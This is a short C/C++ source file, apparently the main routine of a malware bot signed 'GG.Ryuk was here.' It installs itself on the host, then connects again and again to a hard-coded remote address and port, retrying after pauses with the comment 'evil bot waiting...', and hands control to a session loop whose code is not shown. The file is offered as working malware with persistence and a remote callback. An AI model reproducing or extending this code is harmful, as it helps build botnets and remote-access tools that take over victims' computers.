/*
 * GG.Ryuk was here.
 *
 */


#include <stdio.h>
#include <netinet/in.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>

#include "config.h"
#include "coreinstall.hpp"
#include "tcp_client.hpp"

int
bot_single_session()
{
	BOT *bot;
	bool ret;
	int i;

	//close unusable fds
	//close(0);
	//close(1);

	bot = new BOT();

	if (bot->set_ip(TARGET_IP) == false)
		goto err;

	if (bot->set_port(TARGET_PORT) == false)
		goto err;
	
	i = 0;
	while (1) {
		ret = bot->init_connection();
		
		if (ret == true)
			break;

		i++;
		if (i > ATTEMPTS_MAX) {
			//evil bot waiting...
			i = 0;
			sleep(60);
		}

		usleep(IDLE_BETWEEN_CONNECT);
	}

	if (bot->main_loop() == false) {
		printf("main loop ended with some errors\n");
		goto err;
	}
	
	bot->close_connection();

	delete bot;

	return 0;

err:
	delete bot;

	return 1;

}

int
main(int argc, char *argv[])
{
	if (NEED_INSTALLATION)
		self_install();
	
	while (1) {
		//parse conf,
		bot_single_session();
	}
	return 0;
}

